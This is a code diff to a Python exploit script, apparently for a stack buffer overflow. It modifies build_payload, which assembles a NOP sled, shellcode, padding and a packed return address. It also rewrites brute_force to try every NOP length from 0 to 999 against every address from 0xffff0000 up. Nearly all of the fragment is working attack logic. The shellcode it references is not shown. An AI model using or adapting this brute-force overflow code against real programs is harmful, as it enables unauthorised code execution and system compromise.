@@ -39,9 +39,9 @@ def run_exploit(payload):
     
     return False
 
-def build_payload(nop_length, eip_offset):
+def build_payload(nop_length, eip_address):
     nop_sled = b"\x90" * nop_length
-    eip_address = struct.pack("<I", stack_start + eip_offset)
+    eip_address = struct.pack("<I", eip_address)
     
     padding_length = ebp_offset - len(nop_sled) - len(shellcode)
     if padding_length < 0:
@@ -53,13 +53,13 @@ def build_payload(nop_length, eip_offset):
     return payload
 
 def brute_force():
-    # Define the range of offsets and addresses to test
-    offset_range = range(0, 1000, 4)  # Increased the range to 1000
-    addr_range = range(-1000, 1000, 4)  # Expanded the address range
+    # Define the range of NOPs and addresses to test
+    nop_range = range(0, 1000)  # Test every number of NOPs from 0 to 999
+    addr_range = range(0xffff0000, 0xffffffff)  # Test all addresses starting with "ffff"
     
-    for offset in offset_range:
+    for nop_length in nop_range:
         for addr in addr_range:
-            payload = build_payload(offset, addr)
+            payload = build_payload(nop_length, addr)
             if payload is None:
                 continue
             
